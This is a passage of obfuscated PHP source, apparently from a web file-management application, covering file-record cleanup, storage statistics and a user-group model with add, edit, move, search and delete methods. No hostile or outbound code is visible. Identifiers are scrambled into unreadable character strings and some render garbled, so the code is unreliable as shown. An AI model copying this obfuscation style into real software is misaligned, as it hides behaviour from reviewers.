$_SERVER[® ¨Ä®ñ]; if (!$ß§ Ø­¶ && !$‡Ö‘º¶) { return !1; } $‡†ñÄº‰ = array($ï®¸ëñ[1868] => $ß§ Ø­¶); if ($‡Ö‘º¶) { $‡†ñÄº‰ = array($ï®¸ëñ[1869] => $‡Ö‘º¶); } return $this->order($ï®¸ëñ[1875])->where($‡†ñÄº‰)->find(); } public function clearEmpty($µ ÓÌ·Ş = 0) { $ş èëÀ» =& $_SERVER[® ¨Ä®ñ]; $´™†î‘è = time() - 3600 * 24 * $µ ÓÌ·Ş; $ò¸ìÄê’ = $ş èëÀ»[1876] . $´™†î‘è; $ªö’Û‚€ = $this->where($ò¸ìÄê’)->select(); if (!$ªö’Û‚€) { return; } $î«úÜÃ‡ = new Task($ş èëÀ»[1877], $ş èëÀ»[12], count($ªö’Û‚€)); foreach ($ªö’Û‚€ as $·¢¹“êµ) { $î«úÜÃ‡->update(1); $this->resetFile($·¢¹“êµ); } $î«úÜÃ‡->end(); } public function resetFile($áš¿Âí) { $¼…´€¼¸ =& $_SERVER[® ¨Ä®ñ]; $âŞ¯š„Å = array($¼…´€¼¸[459] => $áš¿Âí[$¼…´€¼¸[458]]); $ÓˆñÛ†™ = Model($¼…´€¼¸[1309])->where($âŞ¯š„Å)->count(); $ˆæÃ»šŸ = Model($¼…´€¼¸[1878])->where($âŞ¯š„Å)->count(); $Ã¨Ï“ğ´ = intval($ÓˆñÛ†™) + intval($ˆæÃ»šŸ); if ($Ã¨Ï“ğ´ == 0) { IO::remove($áš¿Âí[$¼…´€¼¸[78]]); Model($¼…´€¼¸[1879])->delete($áš¿Âí[$¼…´€¼¸[458]]); $this->where($âŞ¯š„Å)->delete(); $this->metaSet($áš¿Âí[$¼…´€¼¸[458]], null, null); return; } if ($áš¿Âí[$¼…´€¼¸[1874]] != $Ã¨Ï“ğ´) { $this->where($âŞ¯š„Å)->save(array($¼…´€¼¸[1867] => $Ã¨Ï“ğ´)); } } public function storageInfo($›‰ìôÇÕ = false) { $Š½ËÈ«ß =& $_SERVER[® ¨Ä®ñ]; $ùÕóüÂ¢ = $this->count() + 0.0; $šé»Ìç = 0; $Û±‚ìáû = 1; $Š£œŠğ© = 0; $ÜÌšöùö = 5000; for ($êÛÓ§¤Ğ = 0; $êÛÓ§¤Ğ < $ùÕóüÂ¢; $êÛÓ§¤Ğ = $êÛÓ§¤Ğ + $ÜÌšöùö) { $øÌø = $this->limit($êÛÓ§¤Ğ, $êÛÓ§¤Ğ + $ÜÌšöùö)->select(); foreach ($øÌø as $Şİ™×Á†) { $Û±‚ìáû += $Şİ™×Á†[$Š½ËÈ«ß[80]] * $Şİ™×Á†[$Š½ËÈ«ß[1874]]; $šé»Ìç += $Şİ™×Á†[$Š½ËÈ«ß[80]] * ($Şİ™×Á†[$Š½ËÈ«ß[1874]] - 1); $Š£œŠğ© += $Şİ™×Á†[$Š½ËÈ«ß[1874]]; } } $˜²—ÙË = array($Š½ËÈ«ß[1880] => $Û±‚ìáû, $Š½ËÈ«ß[1881] => $šé»Ìç, $Š½ËÈ«ß[1882] => $šé»Ìç / $Û±‚ìáû, $Š½ËÈ«ß[84] => $ùÕóüÂ¢, $Š½ËÈ«ß[1883] => $Š£œŠğ©); return $˜²—ÙË; } } class GroupModel extends ModelBase { protected $tableName = "\147\162\x6f\165\x70"; protected $tableMeta = array("\x74\141\142\x6c\145\116\141\155\145" => "\x67\x72\157\165\x70\x5f\155\x65\x74\x61", "\155\145\164\141\106\x69\x65\154\144" => "\x67\162\157\165\160\111\x44"); protected function cacheFunctionAlias($ÛÄ‘Ë›ï) { $±ñƒ”ù =& $_SERVER[® ¨Ä®ñ]; return array($±ñƒ”ù[1884] => array($ÛÄ‘Ë›ï[0], $±ñƒ”ù[1885]), $±ñƒ”ù[1886] => array($ÛÄ‘Ë›ï[0], $±ñƒ”ù[1887])); } protected function getInfo($îÃç®‚í, $Ôì‰éòÇ = false) { $½ÇÈÇ“ = $this->getInfoSimple($îÃç®‚í); if (!$½ÇÈÇ“) { return !1; } if ($Ôì‰éòÇ) { return $this->_listDataApplyItem($½ÇÈÇ“); } return $this->cacheFunctionGet($_SERVER[® ¨Ä®ñ][1888], $îÃç®‚í); } protected function getInfoSimple($Şø±Œ³é, $ÕœÀÇÀû = false) { $ ‡Êî¤ =& $_SERVER[® ¨Ä®ñ]; if ($ÕœÀÇÀû) { $ìæÖ†¾ = array($ ‡Êî¤[1807] => intval($Şø±Œ³é)); $®–ğÉÏ = $this->where($ìæÖ†¾)->find(); return is_array($®–ğÉÏ) ? $®–ğÉÏ : array(); } return $this->cacheFunctionGet($ ‡Êî¤[1889], $Şø±Œ³é); } protected function groupAdd($ÙïšıªÚ) { $Úº­¡ÎÂ =& $_SERVER[® ¨Ä®ñ]; if (!$ÙïšıªÚ[$Úº­¡ÎÂ[489]] && isset($ÙïšıªÚ[$Úº­¡ÎÂ[1807]]) && $ÙïšıªÚ[$Úº­¡ÎÂ[1807]] == 1) { if ($Ø£®ÀŒ  = $this->getInfoSimple($ÙïšıªÚ[$Úº­¡ÎÂ[1807]], !0)) { return $ÙïšıªÚ[$Úº­¡ÎÂ[1807]]; } } else { $Ø£®ÀŒ  = $this->getInfoSimple($ÙïšıªÚ[$Úº­¡ÎÂ[489]]); if (!$Ø£®ÀŒ ) { return !1; } } $¬Ğú ¸‡ = $Úº­¡ÎÂ[522]; if ($Ø£®ÀŒ [$Úº­¡ÎÂ[512]]) { $¬Ğú ¸‡ = $Ø£®ÀŒ [$Úº­¡ÎÂ[512]] . $Ø£®ÀŒ [$Úº­¡ÎÂ[1807]] . $Úº­¡ÎÂ[50]; } $ã ãİá¦ = array($Úº­¡ÎÂ[412] => $this->groupNameAuto($ÙïšıªÚ[$Úº­¡ÎÂ[489]], $ÙïšıªÚ[$Úº­¡ÎÂ[32]]), $Úº­¡ÎÂ[393] => $ÙïšıªÚ[$Úº­¡ÎÂ[489]], $Úº­¡ÎÂ[575] => $¬Ğú ¸‡, $Úº­¡ÎÂ[1890] => $ÙïšıªÚ[$Úº­¡ÎÂ[1794]], $Úº­¡ÎÂ[1891] => 0, $Úº­¡ÎÂ[1811] => 0); if (isset($ÙïšıªÚ[$Úº­¡ÎÂ[1830]])) { $ã ãİá¦[$Úº­¡ÎÂ[1830]] = $ÙïšıªÚ[$Úº­¡ÎÂ[1830]]; } else { $˜Éî‚·° = $this->max($Úº­¡ÎÂ[1830]); if (!$˜Éî‚·°) { $˜Éî‚·° = 0; } $ã ãİá¦[$Úº­¡ÎÂ[1830]] = $˜Éî‚·° + 1; } if (!empty($ÙïšıªÚ[$Úº­¡ÎÂ[1807]])) { $ã ãİá¦[$Úº­¡ÎÂ[1807]] = $ÙïšıªÚ[$Úº­¡ÎÂ[1807]]; } $®â±ù¤ = $this->add($ã ãİá¦); $this->setNamePinyin($®â±ù¤, $ã ãİá¦[$Úº­¡ÎÂ[32]]); if (isset($ÙïšıªÚ[$Úº­¡ÎÂ[1892]])) { $this->metaSet($®â±ù¤, array($Úº­¡ÎÂ[1892] => $ÙïšıªÚ[$Úº­¡ÎÂ[1892]], $Úº­¡ÎÂ[1893] => $ÙïšıªÚ[$Úº­¡ÎÂ[1893]])); unset($ÙïšıªÚ[$Úº­¡ÎÂ[1892]]); unset($ÙïšıªÚ[$Úº­¡ÎÂ[1893]]); } Model($Úº­¡ÎÂ[1309])->groupRootAdd($®â±ù¤); return $®â±ù¤; } protected function groupEdit($‹ŞàÎï, $ÃÒìª“) { $åéà¬ =& $_SERVER[® ¨Ä®ñ]; $˜İŒË­ = $this->getInfoSimple($‹ŞàÎï); if (!$˜İŒË­) { return !1; } if (!empty($ÃÒìª“[$åéà¬[489]])) { $Ôç€ßøî = $this->getInfoSimple($ÃÒìª“[$åéà¬[489]]); if (!$Ôç€ßøî) { return !1; } if ($˜İŒË­[$åéà¬[1807]] == $Ôç€ßøî[$åéà¬[1807]]) { return !1; } if ($ÃÒìª“[$åéà¬[489]] != $˜İŒË­[$åéà¬[489]]) { if ($Ôç€ßøî[$åéà¬[512]] !== $˜İŒË­[$åéà¬[512]] && strpos($Ôç€ßøî[$åéà¬[512]], $˜İŒË­[$åéà¬[512]] . $˜İŒË­[$åéà¬[1807]] . $åéà¬[50]) === 0) { return !1; } $ÃÒìª“[$åéà¬[575]] = $Ôç€ßøî[$åéà¬[512]] . $ÃÒìª“[$åéà¬[489]] . $åéà¬[50]; $this->_changeChildLevel($˜İŒË­, $Ôç€ßøî); } } if (isset($ÃÒìª“[$åéà¬[32]])) { $this->setNamePinyin($‹ŞàÎï, $ÃÒìª“[$åéà¬[32]]); } if (isset($ÃÒìª“[$åéà¬[1892]])) { $this->metaSet($‹ŞàÎï, array($åéà¬[1892] => $ÃÒìª“[$åéà¬[1892]], $åéà¬[1893] => $ÃÒìª“[$åéà¬[1893]])); unset($ÃÒìª“[$åéà¬[1892]]); unset($ÃÒìª“[$åéà¬[1893]]); } $this->_clearChildrenCache($˜İŒË­); return $this->where(array($åéà¬[1894] => $‹ŞàÎï))->save($ÃÒìª“); } private function _clearChildrenCache($­É¦„×) { $òå¼÷íÔ =& $_SERVER[® ¨Ä®ñ]; $ëü·±„â = array($òå¼÷íÔ[575] => array($òå¼÷íÔ[535], $­É¦„×[$òå¼÷íÔ[512]] . $­É¦„×[$òå¼÷íÔ[1807]] . $òå¼÷íÔ[536])); $ÜÜÄş‘¿ = $this->field($òå¼÷íÔ[1807])->where($ëü·±„â)->select(); foreach ($ÜÜÄş‘¿ as $áÃ³¬¤´) { $this->_clearCache($áÃ³¬¤´[$òå¼÷íÔ[1807]]); } } private function _clearCache($”ıêÀ»Á) { $†ùıè¹ =& $_SERVER[® ¨Ä®ñ]; $this->cacheFunctionClear($†ùıè¹[1888], $”ıêÀ»Á); $this->cacheFunctionClear($†ùıè¹[1889], $”ıêÀ»Á); } private function _changeChildLevel($–ıÅ¾¹, $»è½ÈêÀ, $†ï¤–¶½ = false) { $šÎ±±şã =& $_SERVER[® ¨Ä®ñ]; $ñá©„³¦ = $–ıÅ¾¹[$šÎ±±şã[512]] . $–ıÅ¾¹[$šÎ±±şã[1807]] . $šÎ±±şã[50]; $Û¼ä¡Ä¯ = $»è½ÈêÀ[$šÎ±±şã[512]] . $»è½ÈêÀ[$šÎ±±şã[1807]] . $šÎ±±şã[50] . $–ıÅ¾¹[$šÎ±±şã[1807]] . $šÎ±±şã[50]; if ($†ï¤–¶½) { $Û¼ä¡Ä¯ = $»è½ÈêÀ[$šÎ±±şã[512]] . $»è½ÈêÀ[$šÎ±±şã[1807]] . $šÎ±±şã[50]; } $ÏØ“Ó˜É = array($šÎ±±şã[575] => array($šÎ±±şã[535], $–ıÅ¾¹[$šÎ±±şã[512]] . $–ıÅ¾¹[$šÎ±±şã[1807]] . $šÎ±±şã[536])); $ÄçâŠÊÊ = array($šÎ±±şã[575] => array($šÎ±±şã[584], "\162\x65\160\154\141\x63\x65\50\160\x61\162\x65\156\x74\x4c\x65\x76\145\x6c\54\47{$ñá©„³¦}\47\54\x27{$Û¼ä¡Ä¯}\x27\51")); $this->_clearChildrenCache($–ıÅ¾¹); $this->where($ÏØ“Ó˜É)->data($ÄçâŠÊÊ)->save(); } public function setNamePinyin($¼Ñ´Œæå, $Ô‡ò„Ş² = false) { $ı«²„‰¾ =& $_SERVER[® ¨Ä®ñ]; if (!$Ô‡ò„Ş²) { $ÛùÊ¡û‹ = $this->getInfoSimple($¼Ñ´Œæå); $Ô‡ò„Ş² = $ÛùÊ¡û‹[$ı«²„‰¾[32]]; } if (!Input::check($Ô‡ò„Ş², $ı«²„‰¾[578])) { $this->metaSet($¼Ñ´Œæå, $ı«²„‰¾[455], null); $this->metaSet($¼Ñ´Œæå, $ı«²„‰¾[454], null); return; } $“ƒ¿¾´– = array($ı«²„‰¾[455] => str_replace($ı«²„‰¾[53], $ı«²„‰¾[12], Pinyin::get($Ô‡ò„Ş²)), $ı«²„‰¾[454] => Pinyin::get($Ô‡ò„Ş², $ı«²„‰¾[579])); $this->metaSet($¼Ñ´Œæå, $“ƒ¿¾´–); } protected function groupStatus($°ªø×á, $Ôƒ‘ğœ) { $ÎÛâÜ×® =& $_SERVER[® ¨Ä®ñ]; $¯Êçà¾± = $this->getInfoSimple($°ªø×á); if (!$¯Êçà¾±) { return !1; } if ($Ôƒ‘ğœ == $ÎÛâÜ×®[89]) { $ó¢ÁÚı‘ = $this->parentLevelArray($¯Êçà¾±[$ÎÛâÜ×®[512]]); } else { $—‡öáµá = array($ÎÛâÜ×®[575] => array($ÎÛâÜ×®[535], $¯Êçà¾±[$ÎÛâÜ×®[512]] . $¯Êçà¾±[$ÎÛâÜ×®[1807]] . $ÎÛâÜ×®[536])); $ó¢ÁÚı‘ = $this->where($—‡öáµá)->field($ÎÛâÜ×®[1807])->select(); $ó¢ÁÚı‘ = array_to_keyvalue($ó¢ÁÚı‘, $ÎÛâÜ×®[12], $ÎÛâÜ×®[1807]); } $ó¢ÁÚı‘[] = $¯Êçà¾±[$ÎÛâÜ×®[1807]]; $­Æä™¶Ã = array(); foreach ($ó¢ÁÚı‘ as $°ªø×á) { $­Æä™¶Ã[] = array($ÎÛâÜ×®[1807] => $°ªø×á, $ÎÛâÜ×®[95] => $ÎÛâÜ×®[732], $ÎÛâÜ×®[369] => $Ôƒ‘ğœ); $this->_clearCache($°ªø×á); } return Model($ÎÛâÜ×®[1895])->addAll($­Æä™¶Ã, array(), !0); } protected function groupRemove($ÒÛòï) { $ÌÓÔ¼šã =& $_SERVER[® ¨Ä®ñ]; $İö¸Ä¡Ì = array($ÌÓÔ¼šã[1807] => $ÒÛòï); $†„Ôè­š = $this->where($İö¸Ä¡Ì)->find(); if (!$†„Ôè­š || $†„Ôè­š[$ÌÓÔ¼šã[489]] == 0) { return !1; } $·¶è­Î = $this->getInfoSimple($†„Ôè­š[$ÌÓÔ¼šã[489]]); $this->_changeChildLevel($†„Ôè­š, $·¶è­Î, !0); $this->where(array($ÌÓÔ¼šã[489] => $ÒÛòï))->save(array($ÌÓÔ¼šã[489] => $†„Ôè­š[$ÌÓÔ¼šã[489]])); Model($ÌÓÔ¼šã[1895])->where($İö¸Ä¡Ì)->delete(); Model($ÌÓÔ¼šã[1896])->where($İö¸Ä¡Ì)->delete(); Model($ÌÓÔ¼šã[807])->groupRootRemove($ÒÛòï); return $this->where($İö¸Ä¡Ì)->delete(); } protected function groupSort($ ¥æË»Æ) { $àŠñ«Ã¥ =& $_SERVER[® ¨Ä®ñ]; $Ôìáê¡± = array(); foreach ($ ¥æË»Æ as $à§ú‹üİ => $ä¹‰ŒÌ”) { $Ôìáê¡±[] = array($àŠñ«Ã¥[1807], $ä¹‰ŒÌ”, $àŠñ«Ã¥[1830], $à§ú‹üİ + 1); } $this->saveAll($Ôìáê¡±); } public function listData() { $®ÊåïË¾ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($®ÊåïË¾[$_SERVER[® ¨Ä®ñ][364]]); return $®ÊåïË¾; } private function _makeOrder($ÄôÅ„êõ = '') { $£Àşâ²’ =& $_SERVER[® ¨Ä®ñ]; $‡¥ªìç = array($£Àşâ²’[1807], $£Àşâ²’[32], $£Àşâ²’[1796], $£Àşâ²’[193]); $“õó…‡½ = array($£Àşâ²’[439] => $£Àşâ²’[440], $£Àşâ²’[441] => $£Àşâ²’[442]); $Ï¡µÒõ÷ = Input::get($£Àşâ²’[446], $£Àşâ²’[7], $£Àşâ²’[1811], $‡¥ªìç); $¸à–Äˆ‡ = Input::get($£Àşâ²’[447], $£Àşâ²’[7], $£Àşâ²’[1897], array($£Àşâ²’[1897], $£Àşâ²’[441])); $¸à–Äˆ‡ = $“õó…‡½[$¸à–Äˆ‡]; $ÄôÅ„êõ = $ÄôÅ„êõ . "{$Ï¡µÒõ÷}\x20{$¸à–Äˆ‡}\54\40\x67\x72\x6f\x75\x70\111\x44\x20\141\x73\x63"; return $this->order($ÄôÅ„êõ); } public function listChild($İ‘ĞæòÛ) { $æ¬ òÛ½ =& $_SERVER[® ¨Ä®ñ]; $ığÅŠÒˆ = $this->where(array($æ¬ òÛ½[489] => $İ‘ĞæòÛ))->_makeOrder()->selectPage(200); $this->_listDataApply($ığÅŠÒˆ[$æ¬ òÛ½[364]]); return $ığÅŠÒˆ; } public function listByID($Õ×ŒÙ) { $šÀÀÔİ =& $_SERVER[® ¨Ä®ñ]; if (!$Õ×ŒÙ) { return array(); } $’Ç‡ç”· = array($šÀÀÔİ[1807] => array($šÀÀÔİ[7], $Õ×ŒÙ)); $çÔ½’øä = $this->where($’Ç‡ç”·)->select(); $çÔ½’øä = array_sort_keep($çÔ½’øä, $šÀÀÔİ[1807], $Õ×ŒÙ); $this->_listDataApply($çÔ½’øä); return $çÔ½’øä; } public function listSearch($¦ÙéèÎ¡) { $ó¨‚š™ñ =& $_SERVER[® ¨Ä®ñ]; $ºè•ˆøİ = $¦ÙéèÎ¡[$ó¨‚š™ñ[1898]]; $‘çÎ­Ê¬ = isset($¦ÙéèÎ¡[$ó¨‚š™ñ[1899]]) ? $¦ÙéèÎ¡[$ó¨‚š™ñ[1899]] : !1; if (!trim($ºè•ˆøİ)) { return !1; } $ºè•ˆøİ = str_replace($ó¨‚š™ñ[1900], $ó¨‚š™ñ[1901], $ºè•ˆøİ); $ÔÃôô  = array($ó¨‚š™ñ[1807] => array($ó¨‚š™ñ[378], "{$ºè•ˆøİ}\x25"), $ó¨‚š™ñ[32] => array($ó¨‚š™ñ[378], "\45{$ºè•ˆøİ}\x25"), $ó¨‚š™ñ[984] => $ó¨‚š™ñ[1902]); if ($‘çÎ­Ê¬) { $ìçíĞµŞ = $this->getInfoSimple($‘çÎ­Ê¬); $Å¤Â‘Ÿå = $ìçíĞµŞ[$ó¨‚š™ñ[512]] . $‘çÎ­Ê¬ . $ó¨‚š™ñ[536]; $ÔÃôô  = array($ÔÃôô , array($ó¨‚š™ñ[512] => array($ó¨‚š™ñ[378], $Å¤Â‘Ÿå))); } $ÔÃôô  = $this->parseWhereLike($ÔÃôô ); $«–ˆ…Ğ™ = $this->_makeOrder()->where($ÔÃôô )->selectPage(20); $«–ˆ…Ğ™ = $«–ˆ…Ğ™ ? $«–ˆ…Ğ™ : array($ó¨‚š™ñ[364] => array(), $ó¨‚š™ñ[361] => array()); if (!$«–ˆ…Ğ™ || count($«–ˆ…Ğ™[$ó¨‚š™ñ[364]]) < 5 && Input::check($ºè•ˆøİ, $ó¨‚š™ñ[313])) { $ÙÀâ‚¡¹ = $this->groupChildrenAll($‘çÎ­Ê¬); $ë ˜‰ö = $this->_searchFromMeta($ó¨‚š™ñ[454], $ºè•ˆøİ, 10, $ÙÀâ‚¡¹); $Ã•ñÜ  = $this->_searchFromMeta($ó¨‚š™ñ[455], $ºè•ˆøİ, 10, $ÙÀâ‚¡¹); $üéì¹çÊ = array_merge($ë ˜‰ö, $Ã•ñÜ , $«–ˆ…Ğ™[$ó¨‚š™ñ[364]]); $«–ˆ…Ğ™[$ó¨‚š™ñ[364]] = array_unique_by_key($üéì¹çÊ, $ó¨‚š™ñ[1807]); $«–ˆ…Ğ™[$ó¨‚š™ñ[361]][$ó¨‚š™ñ[362]] = count($«–ˆ…Ğ™[$ó¨‚š™ñ[364]]); $«–ˆ…Ğ™[$ó¨‚š™ñ[361]][$ó¨‚š™ñ[363]] = ceil($«–ˆ…Ğ™[$ó¨‚š™ñ[361]][$ó¨‚š™ñ[362]] / $«–ˆ…Ğ™[$ó¨‚š™ñ[361]][$ó¨‚š™ñ[358]]); } $this->_listDataApply($«–ˆ…Ğ™[$ó¨‚š™ñ[364]]); return $«–ˆ…Ğ™; } protected function groupChildrenAll($š¼§ÈŸ´) { $ĞÀ×İŒ =& $_SERVER[® ¨Ä®ñ]; if (!$š¼§ÈŸ´) { return !1; } if (is_string($š¼§ÈŸ´)) { $š¼§ÈŸ´ = array($š¼§ÈŸ´); } $ºÙ‚ÊË÷ = $š¼§ÈŸ´; foreach ($š¼§ÈŸ´ as $•º×¹üÄ) { $Î†’‰ğã = $this->getInfoSimple($•º×¹üÄ); $Àã¯óìµ = array($ĞÀ×İŒ[512] => array($ĞÀ×İŒ[378], $Î†’‰ğã[$ĞÀ×İŒ[512]] . $•º×¹üÄ . $ĞÀ×İŒ[536])); $ÃÜùÏ·” = $this->field($ĞÀ×İŒ[1807])->where($Àã¯óìµ)->select(); $ºÙ‚ÊË÷ = array_merge($ºÙ‚ÊË÷, array_to_keyvalue($ÃÜùÏ·”, $ĞÀ×İŒ[12], $ĞÀ×İŒ[1807])); } return array_unique($ºÙ‚ÊË÷); } private function _searchFromMeta($¬òïç, $ÉÌ—¥, $¿«ÅîÅ½, $–ºüÜ†°) { $Çóş¥ =& $_SERVER[® ¨Ä®ñ]; $ÉÌ—¥ = strtolower($ÉÌ—¥); $¨ù¼êÏ¥ = array($Çóş¥[95] => $¬òïç, $Çóş¥[369] => array($Çóş¥[378], "\x25{$ÉÌ—¥}\45")); $¨ù¼êÏ¥ = $this->parseWhereLike($¨ù¼êÏ¥); if ($–ºüÜ†°) { $¨ù¼êÏ¥[$Çóş¥[1807]] = array($Çóş¥[7], $–ºüÜ†°); } $¹Ü„© = Model($Çóş¥[1903])->where($¨ù¼êÏ¥)->limit($¿«ÅîÅ½)->select(); if (!$¹Ü„©) { return array(); } $¹Ü„© = array_to_keyvalue($¹Ü„©, $Çóş¥[12], $Çóş¥[1807]); $€€ë¬òÄ = $this->where(array($Çóş¥[1894] => array($Çóş¥[7], $¹Ü„©)))->select(); if (!$€€ë¬òÄ) { return array(); } return $€€ë¬òÄ; } protected function _listDataApplyItem($ß¨Œ¶Í½) { $ê¦ëˆìÄ = array($ß¨Œ¶Í½); $this->_listDataApply($ê¦ëˆìÄ); return $ê¦ëˆìÄ[0]; } protected function _listDataApply(&$â¯ªŠğ) { $ÛÚŠèÎ =& $_SERVER[® ¨Ä®ñ]; if (!$â¯ªŠğ) { return; } $²Íá¦—ö = array_to_keyvalue($â¯ªŠğ, $ÛÚŠèÎ[12], $ÛÚŠèÎ[1807]); $this->_listAppendChildren($â¯ªŠğ); $this->_listAppendChildrenMember($â¯ªŠğ); $this->_listAppendMeta($â¯ªŠğ, $²Íá¦—ö); $this->_listAppendParent($â¯ªŠğ); $this->_listAppendSourceRoot($â¯ªŠğ, $²Íá¦—ö); } private function _listAppendChildren(&$ŠĞì°) { $ø ßéæ’ =& $_SERVER[® ¨Ä®ñ]; $¦õãœß© = array_to_keyvalue($ŠĞì°, $ø ßéæ’[12], $ø ßéæ’[1807]); $ÏÏª—øŸ = array($ø ßéæ’[489] => array($ø ßéæ’[7], $¦õãœß©)); $Î²ÍŞ“ = array($ø ßéæ’[489], $ø ßéæ’[1904] => $ø ßéæ’[491]); $äú·Š¥• = $this->field($Î²ÍŞ“)->where($ÏÏª—øŸ)->group($ø ßéæ’[489])->select(); $½åÓ³Öœ = array_to_keyvalue($äú·Š¥•, $ø ßéæ’[489], $ø ßéæ’[491]); foreach ($ŠĞì° as &$ —œñò) { $ïŞú³Û™ = $ —œñò[$ø ßéæ’[1807]]; $ —œñò[$ø ßéæ’[1905]] = isset($½åÓ³Öœ[$ïŞú³Û™]) ? intval($½åÓ³Öœ[$ïŞú³Û™]) : !1; } unset($ —œñò); } private function _listAppendChildrenMember(&$ÈõÉãš§) { $Ùâ— éâ =& $_SERVER[® ¨Ä®ñ]; $¦Øà» = array_to_keyvalue($ÈõÉãš§, $Ùâ— éâ[12], $Ùâ— éâ[1807]); $šÍ±ô› = array($Ùâ— éâ[1807] => array($Ùâ— éâ[7], $¦Øà»)); $×òª”ä = array($Ùâ— éâ[1807], $Ùâ— éâ[1904] => $Ùâ— éâ[491]); $¾Ö¸©®» = Model($Ùâ— éâ[1896])->field($×òª”ä)->where($šÍ±ô›)->group($Ùâ— éâ[1807])->select(); $‰£‹®— = array_to_keyvalue($¾Ö¸©®», $Ùâ— éâ[1807], $Ùâ— éâ[491]); foreach ($ÈõÉãš§ as &$¼«Ö«ï) { $ÏÜçÕ¼ = $¼«Ö«ï[$Ùâ— éâ[1807]]; $¼«Ö«ï[$Ùâ— éâ[1906]] = isset($‰£‹®—[$ÏÜçÕ¼]) ? intval($‰£‹®—[$ÏÜçÕ¼]) : !1; } unset($¼«Ö«ï); } private function _listAppendMeta(&$¹³á–Æ‹, $‹‘¬ú“á) { $‰ìªûô =& $_SERVER[® ¨Ä®ñ]; $ÛïÚÂ­ = array($‰ìªûô[1807] => array($‰ìªûô[7], $‹‘¬ú“á)); $Õ‘Ãş‡ = Model($‰ìªûô[1895])->where($ÛïÚÂ­)->select(); $Õ‘Ãş‡ = array_to_keyvalue_group($Õ‘Ãş‡, $‰ìªûô[1807]); foreach ($Õ‘Ãş‡ as &$ñ»·Ù‹Ã) { $ñ»·Ù‹Ã = array_to_keyvalue($ñ»·Ù‹Ã, $‰ìªûô[95], $‰ìªûô[369]); } unset($ñ»·Ù‹Ã); foreach ($¹³á–Æ‹ as &$ªÔ‘â¦) { $ªÔ‘â¦[$‰ìªûô[456]] = array(); if (isset($Õ‘Ãş‡[$ªÔ‘â¦[$‰ìªûô[1807]]])) { $ªÔ‘â¦[$‰ìªûô[456]] = $Õ‘Ãş‡[$ªÔ‘â¦[$‰ìªûô[1807]]]; } } unset($ªÔ‘â¦); } protected function parentLevelArray($Ù‰Ñèó”) { $û­º§Ë =& $_SERVER[® ¨Ä®ñ]; $Ù‰Ñèó” = explode($û­º§Ë[50], trim($Ù‰Ñèó”, $û­º§Ë[50])); $Ù‰Ñèó” = array_remove_value($Ù‰Ñèó”, $û­º§Ë[190]); return $Ù‰Ñèó”; } private function _listAppendParent(&$è¶âÌëˆ) { $âÇÒï±é =& $_SERVER[® ¨Ä®ñ]; $¦ÓøËÓ  = array(); foreach ($è¶âÌëˆ as &$²ôîƒ¶•) { $¦ÓøËÓ [$²ôîƒ¶•[$âÇÒï±é[1807]]] = $²ôîƒ¶•[$âÇÒï±é[32]]; $³Œ¸½š› = $this->parentLevelArray($²ôîƒ¶•[$âÇÒï±é[512]]); foreach ($³Œ¸½š› as $ÙÁ¡­öß) { if (!isset($¦ÓøËÓ [$ÙÁ¡­öß])) { $¦ÓøËÓ [$ÙÁ¡­öß] = 0; } } } unset($²ôîƒ¶•); foreach ($¦ÓøËÓ  as $»›¡ Ğ™ => $ùœ‘îñø) { if ($ùœ‘îñø) { continue; } $¯ÔìæÅ = $this->getInfoSimple($»›¡ Ğ™); $¦ÓøËÓ [$»›¡ Ğ™] = $¯ÔìæÅ[$âÇÒï±é[32]]; } $ûø…¹­« = $GLOBALS[$âÇÒï±é[6]][$âÇÒï±é[90]][$âÇÒï±é[1907]]; if ($GLOBALS[$âÇÒï±é[496]] == $âÇÒï±é[89]) { $ûø…¹­« = !1; } foreach ($è¶âÌëˆ as &$²ôîƒ¶•) { $³Œ¸½š› = $this->parentLevelArray($²ôîƒ¶•[$âÇÒï±é[512]]); $º†ŸÛ”« = $âÇÒï±é[12]; foreach ($³Œ¸½š› as $»›¡ Ğ™ => $ÙÁ¡­öß) { if ($ûø…¹­« && $»›¡ Ğ™ == 0) { continue; } $º†ŸÛ”« .= $¦ÓøËÓ [$ÙÁ¡­öß] . $âÇÒï±é[8]; } if ($³Œ¸½š›) { $º†ŸÛ”« .= $²ôîƒ¶•[$âÇÒï±é[32]]; } $²ôîƒ¶•[$âÇÒï±é[517]] = str_replace($âÇÒï±é[520], $âÇÒï±é[8], $º†ŸÛ”«); } unset($²ôîƒ¶•); } private function _listAppendSourceRoot(&$è›®Ğ ˆ, $ãïÏÓÉ) { $ ùÎµ¹ =& $_SERVER[® ¨Ä®ñ]; $áîÈòÄÈ = Model($ ùÎµ¹[807])->listSourceRoot(SourceModel::TYPE_GROUP, $ãïÏÓÉ); $áîÈòÄÈ = array_to_keyvalue($áîÈòÄÈ, $ ùÎµ¹[495]); $áîÈòÄÈ = array_remove_key($áîÈòÄÈ, $ ùÎµ¹[495]); foreach ($è›®Ğ ˆ as &$îĞ…çú) { $îĞ…çú[$ ùÎµ¹[87]] = $áîÈòÄÈ[$îĞ…çú[$ ùÎµ¹[1807]]] ? $áîÈòÄÈ[$îĞ…çú[$ ùÎµ¹[1807]]] : array(); } unset($îĞ…çú); } protected function groupMerge($õ–‡«éá) { $õ–‡«éá = array_values(array_unique($õ–‡«éá)); $™‹ë—˜… = array(); for ($¢ŠÕ…æŸ = 0; $¢ŠÕ…æŸ < count($õ–‡«éá); $¢ŠÕ…æŸ++) { $´§– ¶” = !1; for ($¸ñÀŒÉø = 0; $¸ñÀŒÉø < count($õ–‡«éá); $¸ñÀŒÉø++) { if ($¢ŠÕ…æŸ == $¸ñÀŒÉø) { continue; } if ($this->isParentOf($õ–‡«éá[$¸ñÀŒÉø], $õ–‡«éá[$¢ŠÕ…æŸ])) { $´§– ¶” = !0; break; } } if (!$´§– ¶”) { $™‹ë—˜…[] = $õ–‡«éá[$¢ŠÕ…æŸ]; } } return $™‹ë—˜…; } protected function isParentOf($ø˜‘š·©, $Œ“ùï«Ì) { $öîàŠ…± =& $_SERVER[® ¨Ä®ñ]; if (!$ø˜‘š·© || !$Œ“ùï«Ì || $ø˜‘š·© == $Œ“ùï«Ì) { return !1; } $¤÷û˜¢ = $this->getInfoSimple($ø˜‘š·©); $åÇÙ‡«á = $this->getInfoSimple($Œ“ùï«Ì); $à¾ò™ºÇ = $¤÷û˜¢[$öîàŠ…±[512]] . $ø˜‘š·© . $öîàŠ…±[50]; if (substr($åÇÙ‡«á[$öîàŠ…±[512]], 0, strlen($à¾ò™ºÇ)) == $à¾ò™ºÇ) { return !0; } return !1; } public function groupShowRoot($­–êâö˜, $¢ĞÌº·» = false) { $ï„‹É™ 